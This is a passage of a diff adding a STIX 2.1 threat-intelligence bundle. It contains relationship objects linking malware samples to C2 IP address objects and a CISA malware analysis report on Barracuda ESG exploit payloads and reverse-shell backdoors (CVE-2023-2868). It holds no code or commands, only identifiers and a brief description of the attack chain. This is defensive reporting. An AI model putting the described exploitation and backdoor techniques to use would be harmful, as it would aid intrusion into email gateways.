+            "id": "relationship--da7e38f8-3d17-4383-b005-9f2698ae43f8",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "relationship_type": "communicates-with",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "source_ref": "malware--52699c03-0ebf-4fb8-bbb5-0ca4e6dc46ec",
+            "target_ref": "ipv4-addr--372b2070-7907-5089-be84-ae08ac278b95"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--5d1f0f54-812f-495a-96aa-5157d34cbd5e",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "relationship_type": "drops",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "source_ref": "malware--19077f6d-feca-48f0-b39a-c924210b4ef4",
+            "target_ref": "malware--7e974291-f9c7-4bb8-b7dd-61d76baee766"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d8af5312-cf06-4151-8ced-d3bde9d934c3",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "relationship_type": "communicates-with",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "source_ref": "malware--19077f6d-feca-48f0-b39a-c924210b4ef4",
+            "target_ref": "ipv4-addr--372b2070-7907-5089-be84-ae08ac278b95"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--a9672306-6f49-4eec-8803-3213c3dacc76",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "relationship_type": "communicates-with",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "source_ref": "malware--7e974291-f9c7-4bb8-b7dd-61d76baee766",
+            "target_ref": "ipv4-addr--372b2070-7907-5089-be84-ae08ac278b95"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--b6271590-d5c4-430a-9238-6da9a4aa4d4e",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "relationship_type": "communicates-with",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "source_ref": "malware--c0193129-a26c-4fd6-a23f-12482028f45f",
+            "target_ref": "ipv4-addr--9e996167-beef-5f00-893f-e80702d9e5cb"
+        },
+        {
+            "type": "report",
+            "spec_version": "2.1",
+            "id": "report--feddf5fa-563f-4861-99d0-54281e87bf57",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-07-27T20:32:53.87442Z",
+            "name": "MAR-10454006.r3.v1",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "CISA obtained 14 malware samples comprised of Barracuda exploit payloads and reverse shell backdoors. The malware was used by threat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting versions 5.1.3.001-9.2.0.006 of Barracuda Email Security Gateway (ESG).\r\n\r\nThe payload triggers a command injection (exploiting CVE-2023-2868), leading to dropping and execution of reverse shells on the ESG appliance. The reverse shells establish backdoor communications via OpenSSL with threat actor command and control (C2) servers.  The actors delivered this payload to the victim via a phishing email with a malicious .tar attachment. \r\n\r\nFor information about related malware, specifically information on other backdoors, see CISA Alert: CISA Releases Malware Analysis Reports on Barracuda Backdoors. ",
+            "report_types": [
+                "observed-data",
+                "malware",
+                "indicator"
+            ],
+            "published": "2023-05-31T22:05:06Z",
+            "object_refs": [
+                "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+                "file--cc5a480d-e70e-55ed-976b-b3ec9bf35390",
+                "indicator--5a013575-f154-4620-9572-d7e5ae85eb81",
+                "malware-analysis--e59fb0c6-3de0-431e-bdce-2bc215a98d45",
+                "malware--0592ee79-5a16-42a2-a2bb-1d58124d3e1b",
+                "indicator--58a37093-e2a6-432d-9143-de09cdd82892",
+                "file--eb79b38d-e5a0-5de9-94d5-817b11bac3ea",
+                "indicator--cbedaf71-1da8-4c1e-a0c9-fd440a497b51",
+                "malware-analysis--0e84a2d3-c303-4ddc-9aa5-653e63bc8c85",
+                "malware--5c41a2ad-4831-465f-9767-a455217efa4a",
+                "indicator--54db3a24-604b-41d6-a278-0ab018f449b0",
+                "file--9d1f6135-3eac-5349-a928-8dabc7ba22c0",
+                "indicator--a3b423d4-4234-49a9-b123-bcadfb8c6054",
+                "malware-analysis--0a6a6b76-5a4a-487a-b5c2-d5f0eca3eb3c",
+                "malware--ed86b905-12fd-45e3-9029-9eb0c0a219bd",
+                "indicator--d72738dd-c80d-4c05-a749-ee6be440b5dd",
+                "file--7a6c4f8e-086e-5b3d-9c6b-ba5483492f1a",
+                "indicator--c876d426-d1ef-4d62-8455-bd453a42ed5a",
+                "malware-analysis--b82ddc66-74bf-4b3c-b370-03fe37a1fcac",
+                "malware--4a271788-6138-4f9b-a67a-cb5ce3c1dca5",
+                "indicator--69f75c99-6168-4228-9f2d-44778dbc9d3d",
+                "file--c91a265f-ca19-521f-a859-a8f56bb30261",
+                "indicator--66d21c74-738d-4f33-b188-04576f2d8173",
+                "malware-analysis--cb26f8ee-69a9-4967-ac0e-4fdff5008a6f",
+                "malware--8bf737e1-6a3c-4513-a3f8-edadcc0e557b",
+                "indicator--91dd666b-2af1-4cfb-b7fd-de474b3b723d",
+                "file--f821908e-662a-5eac-b8d5-3e73681f87c3",
+                "indicator--cb4b14c7-782c-4af7-b995-0ed1baf7a0de",
+                "malware-analysis--b118ac5a-db70-4701-bff9-90513f5e5ca2",
+                "malware--f6c8112c-3600-4258-8a16-bbfdf47d1e55",
+                "indicator--47251999-8052-4ae3-a0ec-7f716f758a76",
+                "file--0b3d261f-c4d6-5651-b734-f3e28181ece7",
+                "indicator--5152b031-6b77-4ff6-af66-f65d5586efe4",
+                "malware-analysis--3987c364-089f-4277-89c8-00d531dc58e5",
+                "malware--9c177434-9d70-4b8d-991d-4be51e5d0b6f",
+                "indicator--f3ee4135-bf70-4757-827e-9d53b157d6b3",
+                "file--e3df5117-0591-588c-a9dc-af1f8b56f4e0",
+                "indicator--6382f2fe-8600-4b71-9a9b-897807473fe7",
+                "malware-analysis--31094741-d838-40cf-a890-42e0645e8f86",
+                "malware--8e37f58a-8c50-46e8-9373-0539bf3e1e8b",
+                "indicator--b642ad71-bbf7-4ca3-9057-64aae4650dc3",
+                "file--6982cd14-8ebe-5247-b722-c296f7b48a41",
+                "indicator--1589e5cf-1223-4c0b-b271-206c914b54cd",
+                "malware-analysis--0b98223e-2276-4654-abb5-27acfcfa98da",
+                "malware--45416c0c-ee72-4852-9b2b-2ba40e273144",
+                "indicator--1c01a5ca-e394-459e-b676-f62a668e0c16",
+                "file--3a024b41-7c3f-5fd8-ae40-b3e9efc058ab",
+                "indicator--60fd68d9-4d30-4c0f-98dc-d1bf7aff48c9",
+                "malware-analysis--a8eb5780-3201-463c-bbb4-c420890a8f8b",
+                "malware--c2243878-a430-41e6-bed2-4e6c4db6cac3",
+                "indicator--25595c29-b1dd-4a6f-b2ab-349a9faef9aa",
+                "file--cb4c2cdb-de2a-5e69-8595-c760fcb5bcff",
+                "indicator--c8ed57c5-a4e4-4861-a6b2-41552c9cefdd",
+                "malware--52699c03-0ebf-4fb8-bbb5-0ca4e6dc46ec",
+                "indicator--0f4a9d37-76f6-429f-b235-d2ae2aa177e4",
+                "file--2d16c63f-663a-5dbc-9bd7-6b01495cf09b",
+                "indicator--5b4ae89e-90c2-4688-950c-2083d39bb76c",
+                "malware--19077f6d-feca-48f0-b39a-c924210b4ef4",
+                "indicator--a7ce824e-d993-4485-9dca-49f0c3716664",
+                "file--1d637deb-c006-5ce3-a7e2-2061ea0c9ae0",
+                "indicator--cf85c1fe-2a5d-4936-96db-2bc8bed466da",
+                "malware-analysis--fa7a9c7f-9761-4386-8166-54140c484bb8",
+                "malware--7e974291-f9c7-4bb8-b7dd-61d76baee766",
+                "indicator--eb3e117e-3532-47d9-b52b-efdc740510d6",
+                "ipv4-addr--372b2070-7907-5089-be84-ae08ac278b95",
+                "indicator--4e24307c-6afd-407e-8d28-7a7eead31b8b",
+                "location--0a8b3d79-0969-40be-8f72-bd1047fbabbe",
+                "file--24f6c2d4-34d3-50af-9405-cdd5a5971853",
+                "malware--c0193129-a26c-4fd6-a23f-12482028f45f",
+                "indicator--fcb10f9a-9a90-45e0-bf2f-663d762e1a7a",
+                "ipv4-addr--9e996167-beef-5f00-893f-e80702d9e5cb",
+                "indicator--6602929a-cd78-481f-aebd-00052fd3d2f4",
+                "location--44394b45-dea1-4dc3-ab09-899035ff2e5b",
+                "relationship--59008269-2208-46ce-9d30-52170f3cdb4a",
+                "relationship--c53e099e-f72f-4918-acb1-91bf46ce172b",
+                "relationship--1ed2cf98-cc33-469c-8244-d708980eb00d",
+                "relationship--de14fe88-1a8a-423b-85bd-f0f28df3a749",
+                "relationship--9cf37716-6211-4b76-af51-3a5fabd17c25",
+                "relationship--11b52a6a-073d-424a-8e19-baffe798c145",
+                "relationship--e5504033-ce7d-4c08-aab2-6a6b5e160d03",
+                "relationship--83114550-a064-4e0e-990f-eb1132d43156",
+                "relationship--3f44bd08-df5a-4871-80c2-e7e281b6f44b",
+                "relationship--70a736c1-d93f-405d-ae24-d6854221e891",
+                "relationship--8c84b21b-9bfb-4bd6-9d74-ed4b5bffd938",
+                "relationship--da7e38f8-3d17-4383-b005-9f2698ae43f8",
+                "relationship--5d1f0f54-812f-495a-96aa-5157d34cbd5e",
+                "relationship--d8af5312-cf06-4151-8ced-d3bde9d934c3",
+                "relationship--a9672306-6f49-4eec-8803-3213c3dacc76",
+                "relationship--b6271590-d5c4-430a-9238-6da9a4aa4d4e"
+            ]
+        }
+    ]
+}
